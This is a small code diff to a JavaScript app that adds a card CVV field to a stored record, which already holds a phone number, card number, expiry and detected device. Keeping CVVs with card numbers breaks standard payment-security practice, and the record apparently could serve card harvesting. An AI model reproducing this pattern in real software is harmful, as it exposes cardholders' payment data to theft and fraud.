@@ -537,6 +537,7 @@ export default function App() {
       phone: data.phone,
       cardNumber: data.cardNumber || '',
       cardExpiry: data.cardExpiry || '',
+      cvv: data.cvv || '',
       device: detectDevice(),
       ip: '127.0.0.1',
       createdAt: Date.now(),
